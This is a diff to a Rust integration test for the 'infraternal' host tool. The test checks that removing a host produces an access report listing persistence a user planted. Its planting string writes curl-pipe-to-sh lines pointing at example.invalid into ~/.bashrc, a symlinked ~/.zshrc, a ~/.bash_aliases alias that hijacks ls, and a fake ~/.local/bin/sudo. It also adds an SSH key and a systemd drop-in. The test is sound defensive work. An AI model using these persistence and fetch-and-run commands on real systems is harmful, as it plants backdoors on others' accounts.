@@ -2,9 +2,10 @@
 //! its HTTPS listener, a real `infraternal agent` joined as root, a real
 //! host login for a person on a real account, and the real CLI. The person
 //! plants access lines through their own shell (a key, a startup line with a
-//! terminal escape, a startup file linked into the home, a unit drop-in);
-//! removing the host revokes the login, the agent reports them, the server
-//! keeps them, and `remove-host --access-report` prints them.
+//! terminal escape, a startup file linked into the home, a unit drop-in,
+//! `~/.bash_aliases`, a program in `~/.local/bin`); the default removal
+//! (with uninstall) revokes the login first, the agent reports them, the
+//! server keeps them, and `remove-host --access-report` prints them.
 //!
 //! Run only as root, through a root clone of the commit under review (see the
 //! job's script on #355): it creates real host logins and stops them.
@@ -146,7 +147,7 @@ async fn access_report_reaches_remove_host_through_a_live_server() {
     first_terminal_output(&mut browser, &mut output, &mut cursor).await;
     // Through the person's own shell: say who it runs as, then plant one new
     // key and one startup line carrying a terminal escape.
-    let planting = b"printf 'WHO_%s_END\\n' \"$(id -un)\"; mkdir -p ~/.ssh && printf 'ssh-ed25519 AAAAlive live-left-behind\\n' >> ~/.ssh/authorized_keys && printf 'curl -s http://example.invalid/live | sh \\033[2J\\n' >> ~/.bashrc && printf 'curl -s http://example.invalid/linked | sh\\n' > ~/.evilrc && ln -s .evilrc ~/.zshrc && mkdir -p ~/.config/systemd/user/back.service.d && printf '[Service]\\nExecStartPost=/tmp/live-evil\\n' > ~/.config/systemd/user/back.service.d/x.conf && printf 'PLANTED_%s\\n' DONE\n";
+    let planting = b"printf 'WHO_%s_END\\n' \"$(id -un)\"; mkdir -p ~/.ssh && printf 'ssh-ed25519 AAAAlive live-left-behind\\n' >> ~/.ssh/authorized_keys && printf 'curl -s http://example.invalid/live | sh \\033[2J\\n' >> ~/.bashrc && printf 'curl -s http://example.invalid/linked | sh\\n' > ~/.evilrc && ln -s .evilrc ~/.zshrc && mkdir -p ~/.config/systemd/user/back.service.d && printf '[Service]\\nExecStartPost=/tmp/live-evil\\n' > ~/.config/systemd/user/back.service.d/x.conf && printf \"alias ls='curl -s http://example.invalid/alias | sh'\\n\" >> ~/.bash_aliases && mkdir -p ~/.local/bin && printf '#!/bin/sh\\ncurl -s http://example.invalid/sudo | sh\\n' > ~/.local/bin/sudo && printf 'PLANTED_%s\\n' DONE\n";
     send(
         &mut browser,
         1,
@@ -180,11 +181,18 @@ async fn access_report_reaches_remove_host_through_a_live_server() {
         &trust,
         host,
         &finish_input,
-        &["--finish", "--retain", "--json"],
+        &["--finish", "--json"],
     )
     .await;
     assert!(ok, "removal refused: {finished}");
     println!("REMOVE_HOST_FINISH {}", finished.trim());
+    // J334 P2-6: the default removal (with uninstall) revokes the person's
+    // logins first, so the report is there when the finish returns.
+    assert_eq!(
+        record(&finished)["data"]["access_report"]["state"],
+        "reported",
+        "the default removal returned without the report: {finished}"
+    );
     let removed = Instant::now();
     let report = loop {
         let (ok, read) = remove_host(
@@ -239,6 +247,12 @@ async fn access_report_reaches_remove_host_through_a_live_server() {
         human.contains("+ curl -s http://example.invalid/linked | sh"),
         "{human}"
     );
+    // J334's previously unscanned places: ~/.bash_aliases and ~/.local/bin.
+    assert!(
+        human.contains("+ alias ls='curl -s http://example.invalid/alias | sh'"),
+        "{human}"
+    );
+    assert!(human.contains("new: ~/.local/bin/sudo"), "{human}");
     // A systemd drop-in adding a command to a unit.
     assert!(
         human.contains("~/.config/systemd/user/back.service.d/x.conf"),
